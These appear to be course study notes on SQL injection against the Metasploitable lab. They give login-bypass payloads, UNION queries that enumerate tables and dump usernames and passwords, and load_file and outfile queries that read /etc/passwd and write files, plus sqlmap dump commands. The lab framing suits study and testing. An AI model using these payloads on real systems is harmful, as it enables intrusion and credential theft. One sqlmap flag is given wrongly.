# SQL injection
-   To prevent SQL injection, just use parameterized statements, separate data from SQL code
-   Everything will be tested with Metasploitable Linux
-   connect to the Metasploitable Linux SQL Database from Kali Linux (no hacking, only connecting): `mysql -u root -h ip.address.of.MetasploitableLinux`.
-   to discover SQL injection vulnerability: 
    -   try to break page / test text boxes / change URL parameters

## Test text boxes
-   example of bypassing login: 
    -   password field: `xxx' or 1=1 #`
    -   `xxx`: is something random, doesn't matter
    -   `'`: is used to finish the current SQL statement for password, example: `select * from account where user='$USER' and password='$PASSWORD'`
    -   `or 1=1`: inserted true statement
    -   `#`: to finish the SQL statement right after the true statement and everything after is comment (otherwise there would be an error for `'` at the end)  

## Change URL parameters
-   URL parameters on the form (`url?something=something`)
-   example of injection to URL `url/index.php?page=user-infp.php?username=admin&password=123456&...`
    -   change similarly to text box: `url/index.php?page=user-infp.php?username=admin' or 1=1#&password=123456&...` and paste it to the browser url. Sometimes there might be a problem with using `#`, then use URL encoding (https://www.urlencoder.org/): `%23`
    -   `1=1` can be changed for anything like:
        1)  determine how many columns are being selected from the table in current SQL statement by trying maximum of the latest order by column example: `order by 5`. In example on Metasploitable Linux website mutillidae/index.php?page=login.php was found that 5 are selected.
        2)  now use union select with as many columns as discovered in previous SQL statement: `union select 1,database(),user(),version(),5`, this will show current db, user to access the db and version of the db.
        3)  get all the tables stored inside the db by selecting from information schema (this is default table in SQL which includes information about all tables in SQL): `union select 1,table_name,null,null,5 from information_schema.tables`. If many tables are shown add where for the db discovered in 2nd point: `where table_schema = 'db_name'`
        4)   get column names from specific table (accounts): `union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'`
        5)  get all values from specific table (accounts): `union select 1,username,password,is_admin,5 from accounts`

        +  or just read files from server `union select null, load_file('/etc/passwd'),null,null,null`
        +  also file upload is possible `union select null, 'example example',null,null,null into outfile /some/path/on/server/example.txt`

## Discovering SQL injection with SQLmap
-   huge tool which helps to find and exploit SQL injections. Small example on manual attack showed above:
    -   tool automatically looks through all parameters and finds anything that can be injectable:
        ```bash
        sqlmap -u "http://192.168.72.130/mutillidae/index.php?page=login.php?page=user-info.php&username=admin&password=123456&user-info-php-submit-button=View+Account+Details"
        ```
    -   get all databases:
        ```bash
        sqlmap -u "http://192.168.72.130/mutillidae/index.php?page=login.php?page=user-info.php&username=admin&password=123456&user-info-php-submit-button=View+Account+Details --dbs"
        ```
    -   to get current user, just change the `--dbs` to `--current-user`. Same for current db use `--current-user`. 
    -   to get all the tables use params use `--tables -D db_name`, to get columns use `--columns -T accounts -D db_name`
    -   to dump all the data use params `-T accounts -D db_name --dump`